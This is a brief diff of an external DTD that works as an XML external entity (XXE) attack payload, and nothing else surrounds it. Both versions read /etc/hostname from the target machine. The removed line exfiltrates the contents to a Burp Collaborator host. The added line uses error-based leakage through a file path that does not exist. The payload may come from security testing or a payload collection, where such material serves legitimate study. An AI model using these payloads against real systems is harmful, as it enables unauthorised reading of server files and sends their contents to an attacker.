@@ -1,3 +1,3 @@
 <!ENTITY % payload SYSTEM "file:///etc/hostname">
-<!ENTITY % param "<!ENTITY &#x25; exfiltrate SYSTEM 'https://6ryvvx2i0m0lgh5m9ahgfa747vdl1a.burpcollaborator.net/?log=%payload;'>">
+<!ENTITY % param "<!ENTITY &#x25; exfiltrate SYSTEM 'file:///nonexists/%payload;'>">
 %param; %exfiltrate;
